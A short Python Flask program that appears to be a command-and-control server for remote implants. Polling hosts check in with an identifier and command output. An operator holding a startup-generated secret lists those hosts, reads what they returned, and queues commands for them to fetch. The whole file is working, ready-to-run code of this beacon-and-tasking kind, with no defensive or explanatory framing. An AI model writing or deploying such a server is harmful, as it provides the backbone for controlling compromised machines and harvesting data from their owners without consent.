#!/usr/bin/env python3
import argparse
import collections
import datetime
import random
import string
import time
import flask
from flask_sslify import SSLify

app = flask.Flask(__name__)

secret = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))

hosts = {}

max_content_length = 8196

@app.route('/', methods=['POST'])
def index():
    if flask.request.content_length > max_content_length:
        return ''
    iden, output = flask.request.get_data(cache=False, as_text=True).split(':', 1)
    if iden not in hosts:
        hosts[iden] = {'cmd': collections.deque(), 'out': collections.deque()}
    hosts[iden]['tim'] = datetime.datetime.utcnow()
    if output:
        hosts[iden]['out'].append((datetime.datetime.utcnow(), output))
    return ':'.join(hosts[iden]['cmd'].popleft()) if hosts[iden]['cmd'] else ''
    
@app.route('/cmd', methods=['POST'])
def command():
    if flask.request.content_length > max_content_length:
        return ''
    key, cmd, iden, parameters = flask.request.get_data(cache=False, as_text=True).split(':', 3)
    if key != secret:
        time.sleep(1)
    elif cmd == 'L':
        return '\n'.join('{}> {}'.format(v['tim'], k) for k, v in hosts.items())
    elif cmd == 'I' and iden in hosts:
        return '\n'.join('{}> {}'.format(t, o) for t, o in hosts[iden]['out'])
    elif cmd in ['T', 'N', 'C'] and iden in hosts:
        hosts[iden]['cmd'].append((cmd, parameters))
    return ''

if __name__=='__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, required=True)
    parser.add_argument('--cert')
    parser.add_argument('--key')
    args = parser.parse_args()
    sslconfig = (args.cert, args.key) if args.cert and args.key else None
    print('SECRET:', secret)
    app.run(host='0.0.0.0', port=args.port, ssl_context=sslconfig, threaded=True)
